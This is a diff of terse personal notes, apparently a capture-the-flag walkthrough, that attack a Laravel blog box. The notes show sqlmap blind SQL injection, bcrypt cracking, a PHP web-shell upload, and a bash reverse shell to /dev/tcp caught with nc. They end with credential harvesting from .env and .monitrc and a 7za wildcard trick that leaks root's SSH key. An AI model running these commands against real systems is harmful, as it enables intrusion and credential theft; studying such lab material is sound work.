@@ -1,3 +1,5 @@
+1. Log in to Website
+
 Register & login
 Go to Reset password section:
 E-Mail Address: <email>' -> 500 error
@@ -6,6 +8,9 @@ sqlmap -r <request> -p email --level 5 --risk 3 --technique=B --batch -> sql inj
 sqlmap -r <request> -p email --level 5 --risk 3 --technique=B --batch --dbs --threads 10 -> dump: available databases - information schema, performance_schema, usage_blog
 sqlmap -r <request> -p email --level 5 --risk 3 --technique=B --batch --dump usage_blog --threads 10 (-T <tablename>) -> dump: data in table -> hash
 hashcat: bcrypt(-m 3200), rockyou.txt
+
+2. Get shell
+
 login(admin, hashcat password) -> verify laravel 1.8.18 -> upload php vulnerability
 burpsuite: Edit user -> submit & modify form
 
@@ -18,4 +23,24 @@ Content-Type: application/octet-stream
 Edit user -> select shell.php image(i)(Go to Uploaded) -> <url>?cmd=<command> -> burpsuite intercept
 -> change request method -> add 2 enters after last & cmd=bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1' --needs to be url encoded
 nc -nlvp <port> -> user dash
-Go to config -> database.php -> username, password
+
+3. Elevate privilege
+
+/var/www/html/project_admin/config -> database.php -> username, password for mysql(not work)
+/var/www/html/project_admin -> ls -la -> cat .env -> username, password
+-> mysql -u <username> -p
+-> show databases -> nothing interesting...
+cd ~(home) -> cat .monitrc -> password
+cat /etc/passwd | grep sh$ -> get bash credentials -> su xander with above password
+sudo -l: /usr/bin/usage_management
+strings /usr/bin/usage_management has line: 
+/var/www/html/
+/usr/bin/7za a /var/backups/project.zip -tzip -snl -mnt -- *
+***Scan through all the files in directory
+***7z a <zip> @<filename>: Backup line by line(lists)
+
+touch -- @id_rsa
+ln -s /root/.ssh/id_rsa id_rsa
+mv * /var/www/html/
+sudo /usr/bin/usage_management -> get id_rsa -> save
+ssh -i <saved rsa> root@<ip>
